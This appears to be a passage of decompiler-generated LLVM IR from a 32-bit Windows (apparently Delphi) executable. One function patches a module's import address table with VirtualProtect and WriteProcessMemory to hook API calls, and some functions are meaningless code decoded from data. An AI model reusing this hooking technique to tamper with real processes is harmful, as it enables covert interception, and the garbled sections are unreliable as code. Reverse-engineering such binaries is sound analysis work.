dec_label_pc_4076b3:                              ; preds = %dec_label_pc_4076ad
  %12 = add i32 %3, 4, !insn.addr !1995
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1995
  %14 = load i32, i32* %13, align 4, !insn.addr !1995
  %15 = inttoptr i32 %14 to i8*, !insn.addr !1996
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !1997
  %17 = ptrtoint i32* %16 to i32, !insn.addr !1997
  %18 = load i32, i32* %5, align 4, !insn.addr !1998
  %19 = icmp eq i32 %18, %17, !insn.addr !1998
  %20 = icmp eq i1 %19, false, !insn.addr !1999
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !1999
  br i1 %20, label %dec_label_pc_4076d6, label %dec_label_pc_4076c1, !insn.addr !1999

dec_label_pc_4076c1:                              ; preds = %dec_label_pc_4076b3
  %21 = load i32, i32* %9, align 4, !insn.addr !2000
  %22 = call i32 @function_4076e4(i32 %21), !insn.addr !2001
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !2001
  br label %dec_label_pc_4076d6, !insn.addr !2001

dec_label_pc_4076d6:                              ; preds = %dec_label_pc_4076c1, %dec_label_pc_4076b3, %dec_label_pc_4076ad, %dec_label_pc_40769c
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !2002
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !2003
  br i1 %24, label %dec_label_pc_4076e1, label %dec_label_pc_4076da, !insn.addr !2003

dec_label_pc_4076da:                              ; preds = %dec_label_pc_4076d6
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !2004
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !2004
  br label %dec_label_pc_4076e1, !insn.addr !2004

dec_label_pc_4076e1:                              ; preds = %dec_label_pc_4076da, %dec_label_pc_4076d6
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !2005
}

define i32 @function_4076e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4076e4:
  %eax.0.reg2mem = alloca i32, !insn.addr !2006
  %esp.0.reg2mem = alloca i32, !insn.addr !2006
  %storemerge6.reg2mem = alloca i32, !insn.addr !2006
  %.reg2mem14 = alloca i32, !insn.addr !2006
  %esp.17.reg2mem = alloca i32, !insn.addr !2006
  %esi.08.reg2mem = alloca i32, !insn.addr !2006
  %.reg2mem = alloca i32, !insn.addr !2006
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !2007
  %4 = icmp eq i1 %3, false, !insn.addr !2008
  %5 = icmp eq i32 %arg1, 0, !insn.addr !2009
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_407791, label %dec_label_pc_40770a, !insn.addr !2008

dec_label_pc_40770a:                              ; preds = %dec_label_pc_4076e4
  %6 = trunc i32 %2 to i16, !insn.addr !2010
  %7 = trunc i32 %1 to i8, !insn.addr !2011
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !2012
  %8 = inttoptr i32 %0 to i32*, !insn.addr !2013
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !2013
  %10 = ptrtoint i32* %9 to i32, !insn.addr !2013
  %11 = icmp eq i32* %9, null, !insn.addr !2014
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !2015
  br i1 %11, label %dec_label_pc_407791, label %dec_label_pc_40778a.preheader, !insn.addr !2015

dec_label_pc_40778a.preheader:                    ; preds = %dec_label_pc_40770a
  %12 = add i32 %10, 12, !insn.addr !2016
  %13 = inttoptr i32 %12 to i32*, !insn.addr !2016
  %14 = load i32, i32* %13, align 4, !insn.addr !2016
  %15 = icmp eq i32 %14, 0, !insn.addr !2017
  %16 = icmp eq i1 %15, false, !insn.addr !2018
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !2018
  br i1 %16, label %dec_label_pc_407723.lr.ph, label %dec_label_pc_407791, !insn.addr !2018

dec_label_pc_407723.lr.ph:                        ; preds = %dec_label_pc_40778a.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !2012
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !2019
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_407723

dec_label_pc_407723:                              ; preds = %dec_label_pc_407723.lr.ph, %dec_label_pc_407787
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !2020
  %24 = add i32 %esp.17.reload, -4, !insn.addr !2021
  %25 = inttoptr i32 %24 to i32*, !insn.addr !2021
  store i32 %18, i32* %25, align 4, !insn.addr !2021
  %26 = add i32 %esp.17.reload, -8, !insn.addr !2022
  %27 = inttoptr i32 %26 to i32*, !insn.addr !2022
  store i32 %23, i32* %27, align 4, !insn.addr !2022
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2023
  %29 = icmp eq i32 %28, 0, !insn.addr !2024
  %30 = icmp eq i1 %29, false, !insn.addr !2025
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2025
  br i1 %30, label %dec_label_pc_407787, label %dec_label_pc_407736, !insn.addr !2025

dec_label_pc_407736:                              ; preds = %dec_label_pc_407723
  %31 = add i32 %esi.08.reload, 16, !insn.addr !2026
  %32 = inttoptr i32 %31 to i32*, !insn.addr !2026
  %33 = load i32, i32* %32, align 4, !insn.addr !2026
  %34 = add i32 %33, %arg1, !insn.addr !2027
  %35 = inttoptr i32 %34 to i32*, !insn.addr !2028
  %36 = load i32, i32* %35, align 4, !insn.addr !2028
  %37 = icmp eq i32 %36, 0, !insn.addr !2029
  %38 = icmp eq i1 %37, false, !insn.addr !2030
  store i32 %36, i32* %.reg2mem14, !insn.addr !2030
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !2030
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2030
  br i1 %38, label %dec_label_pc_40773e, label %dec_label_pc_407787, !insn.addr !2030

dec_label_pc_40773e:                              ; preds = %dec_label_pc_407736, %dec_label_pc_40777e
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !2031
  %40 = icmp eq i1 %39, false, !insn.addr !2032
  br i1 %40, label %dec_label_pc_40777e, label %dec_label_pc_407743, !insn.addr !2032

dec_label_pc_407743:                              ; preds = %dec_label_pc_40773e
  %41 = add i32 %esp.17.reload, -12, !insn.addr !2033
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2033
  store i32 %20, i32* %42, align 4, !insn.addr !2033
  %43 = add i32 %esp.17.reload, -16, !insn.addr !2034
  %44 = inttoptr i32 %43 to i32*, !insn.addr !2034
  store i32 128, i32* %44, align 4, !insn.addr !2034
  %45 = add i32 %esp.17.reload, -20, !insn.addr !2035
  %46 = inttoptr i32 %45 to i32*, !insn.addr !2035
  store i32 4, i32* %46, align 4, !insn.addr !2035
  %47 = add i32 %esp.17.reload, -24, !insn.addr !2036
  %48 = inttoptr i32 %47 to i32*, !insn.addr !2036
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !2036
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2037
  %50 = add i32 %esp.17.reload, -28, !insn.addr !2038
  %51 = inttoptr i32 %50 to i32*, !insn.addr !2038
  store i32 %21, i32* %51, align 4, !insn.addr !2038
  %52 = add i32 %esp.17.reload, -32, !insn.addr !2039
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2039
  store i32 4, i32* %53, align 4, !insn.addr !2039
  %54 = add i32 %esp.17.reload, -36, !insn.addr !2040
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2040
  store i32 %22, i32* %55, align 4, !insn.addr !2040
  %56 = add i32 %esp.17.reload, -40, !insn.addr !2041
  %57 = inttoptr i32 %56 to i32*, !insn.addr !2041
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !2041
  %58 = call i32* @GetCurrentProcess(), !insn.addr !2042
  %59 = ptrtoint i32* %58 to i32, !insn.addr !2042
  %60 = add i32 %esp.17.reload, -44, !insn.addr !2043
  %61 = inttoptr i32 %60 to i32*, !insn.addr !2043
  store i32 %59, i32* %61, align 4, !insn.addr !2043
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2044
  %63 = add i32 %esp.17.reload, -48, !insn.addr !2045
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2045
  store i32 %21, i32* %64, align 4, !insn.addr !2045
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !2046
  %66 = add i32 %esp.17.reload, -52, !insn.addr !2047
  %67 = inttoptr i32 %66 to i32*, !insn.addr !2047
  store i32 %65, i32* %67, align 4, !insn.addr !2047
  %68 = add i32 %esp.17.reload, -56, !insn.addr !2048
  %69 = inttoptr i32 %68 to i32*, !insn.addr !2048
  store i32 4, i32* %69, align 4, !insn.addr !2048
  %70 = add i32 %esp.17.reload, -60, !insn.addr !2049
  %71 = inttoptr i32 %70 to i32*, !insn.addr !2049
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !2049
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2050
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !2051
  br label %dec_label_pc_407787, !insn.addr !2051

dec_label_pc_40777e:                              ; preds = %dec_label_pc_40773e
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !2052
  %74 = inttoptr i32 %73 to i32*, !insn.addr !2028
  %75 = load i32, i32* %74, align 4, !insn.addr !2028
  %76 = icmp eq i32 %75, 0, !insn.addr !2029
  %77 = icmp eq i1 %76, false, !insn.addr !2030
  store i32 %75, i32* %.reg2mem14, !insn.addr !2030
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !2030
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !2030
  br i1 %77, label %dec_label_pc_40773e, label %dec_label_pc_407787, !insn.addr !2030

dec_label_pc_407787:                              ; preds = %dec_label_pc_40777e, %dec_label_pc_407736, %dec_label_pc_407743, %dec_label_pc_407723
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !2053
  %79 = add i32 %esi.08.reload, 32, !insn.addr !2016
  %80 = inttoptr i32 %79 to i32*, !insn.addr !2016
  %81 = load i32, i32* %80, align 4, !insn.addr !2016
  %82 = icmp eq i32 %81, 0, !insn.addr !2017
  %83 = icmp eq i1 %82, false, !insn.addr !2018
  store i32 %81, i32* %.reg2mem, !insn.addr !2018
  store i32 %78, i32* %esi.08.reg2mem, !insn.addr !2018
  store i32 %esp.0.reload, i32* %esp.17.reg2mem, !insn.addr !2018
  store i32 %81, i32* %eax.0.reg2mem, !insn.addr !2018
  br i1 %83, label %dec_label_pc_407723, label %dec_label_pc_407791, !insn.addr !2018

dec_label_pc_407791:                              ; preds = %dec_label_pc_407787, %dec_label_pc_40778a.preheader, %dec_label_pc_40770a, %dec_label_pc_4076e4
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !2054
}

define i32 @function_40779c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40779c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, 24, !insn.addr !2055
  %2 = inttoptr i32 %1 to i32*, !insn.addr !2055
  %3 = load i32, i32* %2, align 4, !insn.addr !2055
  ret i32 %3, !insn.addr !2056
}

define i32 @function_4077a0() local_unnamed_addr {
dec_label_pc_4077a0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2057
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !2057
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !2057
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2058
  %2 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2059
  %3 = add i32 %2, 1, !insn.addr !2059
  store i32 %3, i32* @global_var_4096f4, align 4, !insn.addr !2059
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !2060
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !2061
  ret i32 0, !insn.addr !2062
}

define i32 @function_4077c5() local_unnamed_addr {
dec_label_pc_4077c5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2063
  ret i32 %0, !insn.addr !2063
}

define i32 @function_4077ca() local_unnamed_addr {
dec_label_pc_4077ca:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2064
}

define i32 @function_4077cc(i32 %arg1) local_unnamed_addr {
dec_label_pc_4077cc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2065
}

define i32 @function_4077d0() local_unnamed_addr {
dec_label_pc_4077d0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2066
  %2 = add i32 %1, -1, !insn.addr !2066
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2066
  ret i32 %0, !insn.addr !2067
}

define i32 @function_4077d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_4077d8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @function_40779c(i32 %1, i32 %2, i32 %0, i32 %arg1, i32 %arg2), !insn.addr !2068
  ret i32 %3, !insn.addr !2069
}

define i32 @function_407824(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_407824:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %arg3, 2975, !insn.addr !2070
  %2 = icmp eq i1 %1, false, !insn.addr !2071
  %spec.select = select i1 %2, i32 %arg3, i32 2974
  %3 = call i32 @function_40779c(i32 %0, i32 %arg1, i32 %arg2, i32 %spec.select, i32 %arg4), !insn.addr !2072
  ret i32 %3, !insn.addr !2073
}

define i32 @function_407854(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_407854:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !2074
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !2074
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !2074
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !2075
  %2 = call i32 @"@LStrFromPChar"(), !insn.addr !2076
  %3 = call i32 @"@LStrPos"(), !insn.addr !2077
  %4 = icmp slt i32 %3, 1
  %spec.select = select i1 %4, i32 %arg4, i32 ptrtoint ([33 x i8]* @global_var_40792c to i32)
  %5 = call i32 @"@LStrFromPChar"(), !insn.addr !2078
  %6 = call i32 @"@LStrPos"(), !insn.addr !2079
  %7 = icmp slt i32 %6, 1
  %esi.0 = select i1 %7, i32 %arg3, i32 ptrtoint ([33 x i8]* @global_var_40792c to i32)
  %8 = call i32 @function_40779c(i32 %arg1, i32 %arg2, i32 %esi.0, i32 %spec.select, i32 %arg5), !insn.addr !2080
  call void @__writefsdword(i32 0, i32 %arg6), !insn.addr !2081
  %9 = call i32 @"@LStrArrayClr"(), !insn.addr !2082
  ret i32 %9, !insn.addr !2083
}

define i32 @function_4078ec() local_unnamed_addr {
dec_label_pc_4078ec:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2084
  ret i32 %0, !insn.addr !2084
}

define i32 @function_4078f1() local_unnamed_addr {
dec_label_pc_4078f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2085
}

define i32 @function_4078f3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4078f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2086
}

define i32 @function_407903() local_unnamed_addr {
dec_label_pc_407903:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2087
}

define i32 @function_407950() local_unnamed_addr {
dec_label_pc_407950:
  %0 = call i32 @function_407610(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4079c0, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4079cc, i32 0, i32 0), i32 4224984), !insn.addr !2088
  store i32 %0, i32* @global_var_408110, align 4, !insn.addr !2089
  %1 = call i32 @function_407610(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_4079c0, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_4079e8, i32 0, i32 0), i32 4225060), !insn.addr !2090
  store i32 %1, i32* @global_var_408114, align 4, !insn.addr !2091
  %2 = call i32 @function_407610(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_407a00, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_407a0c, i32 0, i32 0), i32 4225108), !insn.addr !2092
  store i32 %2, i32* @global_var_408118, align 4, !insn.addr !2093
  ret i32 %2, !insn.addr !2094
}

define i32 @function_4079c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12, i32 %arg13, i32 %arg14, i32 %arg15) local_unnamed_addr {
dec_label_pc_4079c0:
  %merge.reg2mem = alloca i32, !insn.addr !2095
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %6 = call i32 @__decompiler_undefined_function_0()
  %7 = call i1 @__decompiler_undefined_function_1()
  %8 = call i1 @__decompiler_undefined_function_1()
  %9 = call i32 @__decompiler_undefined_function_0()
  %10 = icmp eq i1 %7, false, !insn.addr !2095
  br i1 %10, label %dec_label_pc_4079ef, label %dec_label_pc_4079c2, !insn.addr !2095

dec_label_pc_4079c2:                              ; preds = %dec_label_pc_4079c0
  br i1 %8, label %dec_label_pc_4079f8, label %dec_label_pc_4079c5, !insn.addr !2096

dec_label_pc_4079c5:                              ; preds = %dec_label_pc_4079c2
  %11 = trunc i32 %4 to i16, !insn.addr !2097
  %12 = call i8 @__asm_insb(i16 %11), !insn.addr !2097
  %13 = inttoptr i32 %0 to i8*, !insn.addr !2097
  store i8 %12, i8* %13, align 1, !insn.addr !2097
  %14 = call i8 @__asm_insb(i16 %11), !insn.addr !2098
  store i8 %14, i8* %13, align 1, !insn.addr !2098
  %15 = bitcast i32* %eax to i8*
  %16 = load i8, i8* %15, align 4, !insn.addr !2099
  %17 = load i32, i32* %eax, align 4
  %18 = trunc i32 %17 to i8, !insn.addr !2099
  %19 = add i8 %16, %18, !insn.addr !2099
  %20 = inttoptr i32 %17 to i8*, !insn.addr !2099
  store i8 %19, i8* %20, align 1, !insn.addr !2099
  call void @__asm_outsd(i16 %11, i32 %1), !insn.addr !2100
  %21 = trunc i32 %arg10 to i16, !insn.addr !2101
  %22 = call i32 @__asm_insd(i16 %21), !insn.addr !2101
  %23 = inttoptr i32 %9 to i32*, !insn.addr !2101
  store i32 %22, i32* %23, align 4, !insn.addr !2101
  store i32 %arg1, i32* %eax, align 4, !insn.addr !2102
  %24 = inttoptr i32 %arg1 to i8*, !insn.addr !2103
  %25 = load i8, i8* %24, align 1, !insn.addr !2103
  %26 = trunc i32 %arg1 to i8, !insn.addr !2103
  %27 = add i8 %25, %26, !insn.addr !2103
  store i8 %27, i8* %24, align 1, !insn.addr !2103
  %28 = trunc i32 %arg3 to i16, !insn.addr !2104
  %29 = inttoptr i32 %arg6 to i32*, !insn.addr !2104
  %30 = load i32, i32* %29, align 4, !insn.addr !2104
  call void @__asm_outsd(i16 %28, i32 %30), !insn.addr !2104
  %31 = add i32 %arg5, 67, !insn.addr !2105
  %32 = and i32 %31, 65535
  %33 = inttoptr i32 %32 to i32*, !insn.addr !2105
  %34 = load i32, i32* %33, align 4, !insn.addr !2105
  %35 = load i8, i8* %24, align 1, !insn.addr !2106
  %36 = add i8 %35, %26, !insn.addr !2106
  store i8 %36, i8* %24, align 1, !insn.addr !2106
  %37 = mul i32 %34, 1557718248, !insn.addr !2107
  %38 = add i32 %arg7, 97, !insn.addr !2107
  %39 = add i32 %38, %37, !insn.addr !2107
  %40 = inttoptr i32 %39 to i8*, !insn.addr !2107
  %41 = load i8, i8* %40, align 1, !insn.addr !2107
  %42 = trunc i32 %arg2 to i8
  %43 = add i8 %42, 1, !insn.addr !2107
  %44 = add i8 %43, %41, !insn.addr !2107
  %45 = icmp eq i8 %44, 0, !insn.addr !2107
  store i8 %44, i8* %40, align 1, !insn.addr !2107
  %46 = load i32, i32* %eax, align 4
  store i32 %46, i32* %merge.reg2mem, !insn.addr !2108
  br i1 %45, label %dec_label_pc_407a61, label %dec_label_pc_4079ef, !insn.addr !2108

dec_label_pc_4079ef:                              ; preds = %dec_label_pc_4079c0, %dec_label_pc_4079c5
  %merge.reload = load i32, i32* %merge.reg2mem
  ret i32 %merge.reload, !insn.addr !2109

dec_label_pc_4079f8:                              ; preds = %dec_label_pc_4079c2
  %47 = trunc i32 %6 to i8
  %48 = mul i8 %47, 2, !insn.addr !2110
  %49 = inttoptr i32 %6 to i8*, !insn.addr !2110
  store i8 %48, i8* %49, align 1, !insn.addr !2110
  %50 = add i32 %3, 104, !insn.addr !2111
  %51 = inttoptr i32 %50 to i8*, !insn.addr !2111
  %52 = load i8, i8* %51, align 1, !insn.addr !2111
  %53 = udiv i32 %4, 256, !insn.addr !2111
  %54 = trunc i32 %53 to i8, !insn.addr !2111
  %55 = add i8 %52, %54, !insn.addr !2111
  store i8 %55, i8* %51, align 1, !insn.addr !2111
  %56 = trunc i32 %4 to i16, !insn.addr !2112
  %57 = call i8 @__asm_insb(i16 %56), !insn.addr !2112
  %58 = inttoptr i32 %0 to i8*, !insn.addr !2112
  store i8 %57, i8* %58, align 1, !insn.addr !2112
  %59 = call i8 @__asm_insb(i16 %56), !insn.addr !2113
  store i8 %59, i8* %58, align 1, !insn.addr !2113
  %60 = call i8 @__asm_insb(i16 %56), !insn.addr !2114
  store i8 %60, i8* %58, align 1, !insn.addr !2114
  %61 = call i8 @__asm_insb(i16 %56), !insn.addr !2115
  store i8 %61, i8* %58, align 1, !insn.addr !2115
  %62 = load i8, i8* %51, align 1, !insn.addr !2116
  %63 = trunc i32 %4 to i8, !insn.addr !2116
  %64 = add i8 %62, %63, !insn.addr !2116
  store i8 %64, i8* %51, align 1, !insn.addr !2116
  %65 = call i8 @__asm_insb(i16 %56), !insn.addr !2117
  store i8 %65, i8* %58, align 1, !insn.addr !2117
  %66 = call i8 @__asm_insb(i16 %56), !insn.addr !2118
  store i8 %66, i8* %58, align 1, !insn.addr !2118
  %67 = add i32 %2, 1, !insn.addr !2119
  %68 = icmp slt i32 %67, 0, !insn.addr !2119
  br i1 %68, label %dec_label_pc_407a79, label %dec_label_pc_407a14, !insn.addr !2120

dec_label_pc_407a14:                              ; preds = %dec_label_pc_4079f8
  %69 = mul i32 %1, 256
  %70 = and i32 %69, 65280
  %71 = xor i32 %5, %70, !insn.addr !2121
  %72 = xor i32 %4, %1, !insn.addr !2122
  %73 = bitcast i32* %eax to i8*
  %74 = add i32 %2, 117, !insn.addr !2123
  %75 = inttoptr i32 %74 to i16*, !insn.addr !2123
  %76 = load i16, i16* %75, align 2, !insn.addr !2123
  %77 = trunc i32 %72 to i16, !insn.addr !2123
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2123
  %78 = load i8, i8* %73, align 4, !insn.addr !2124
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2124
  %81 = add i8 %78, %80, !insn.addr !2124
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2124
  store i8 %81, i8* %82, align 1, !insn.addr !2124
  %83 = add i32 %71, 82, !insn.addr !2125
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2125
  %85 = load i8, i8* %84, align 1, !insn.addr !2125
  %86 = add i8 %85, %63, !insn.addr !2125
  store i8 %86, i8* %84, align 1, !insn.addr !2125
  %87 = load i32, i32* %eax, align 4, !insn.addr !2126
  %88 = add i32 %87, -1, !insn.addr !2126
  %89 = add i32 %71, 4227345, !insn.addr !2127
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2127
  %91 = load i8, i8* %90, align 1, !insn.addr !2127
  %92 = udiv i32 %88, 256, !insn.addr !2127
  %93 = trunc i32 %92 to i8, !insn.addr !2127
  %94 = add i8 %91, %93, !insn.addr !2127
  store i8 %94, i8* %90, align 1, !insn.addr !2127
  ret i32 %88, !insn.addr !2127

dec_label_pc_407a61:                              ; preds = %dec_label_pc_4079c5
  %95 = add i32 %46, 1, !insn.addr !2128
  store i32 %95, i32* %eax, align 4, !insn.addr !2128
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2129
  %97 = load i8, i8* %96, align 1, !insn.addr !2129
  %98 = udiv i32 %arg3, 256, !insn.addr !2129
  %99 = trunc i32 %98 to i8, !insn.addr !2129
  %100 = add i8 %97, %99, !insn.addr !2129
  store i8 %100, i8* %96, align 1, !insn.addr !2129
  %101 = add i32 %arg3, 89, !insn.addr !2130
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2130
  store i8 -1, i8* %102, align 1, !insn.addr !2130
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2131
  %103 = load i32, i32* %eax, align 4, !insn.addr !2132
  ret i32 %103, !insn.addr !2132

dec_label_pc_407a79:                              ; preds = %dec_label_pc_4079f8
  %104 = load i32, i32* %eax, align 4, !insn.addr !2133
  ret i32 %104, !insn.addr !2133
}

define i32 @function_407a7c() local_unnamed_addr {
dec_label_pc_407a7c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f8, align 4, !insn.addr !2134
  %2 = add i32 %1, -1, !insn.addr !2134
  store i32 %2, i32* @global_var_4096f8, align 4, !insn.addr !2134
  ret i32 %0, !insn.addr !2135
}

define i32 @function_407a84() local_unnamed_addr {
dec_label_pc_407a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2136
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407aaf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2137
  ret i32 %0, !insn.addr !2137
}

define i32 @function_407ab4() local_unnamed_addr {
dec_label_pc_407ab4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2138
}

define i32 @function_407ab6(i32 %arg1) local_unnamed_addr {
dec_label_pc_407ab6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2139
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407bb8:
  %esp.2.reg2mem = alloca i32, !insn.addr !2140
  %esp.1.reg2mem = alloca i32, !insn.addr !2140
  %esp.0.reg2mem = alloca i32, !insn.addr !2140
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2141
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2142
  store i32 %2, i32* %stack_var_-112, align 4, !insn.addr !2142
  %3 = ptrtoint i32* %stack_var_-112 to i32, !insn.addr !2142
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2143
  store i32 0, i32* %stack_var_-124, align 4, !insn.addr !2144
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096fc to i8*), i32 0), !insn.addr !2145
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096fc to i32), !insn.addr !2146
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2146
  store i8 0, i8* %6, align 1, !insn.addr !2146
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2147
  %8 = call i32 @function_40703c(), !insn.addr !2148
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2149
  %10 = call i32 @function_4070b4(), !insn.addr !2150
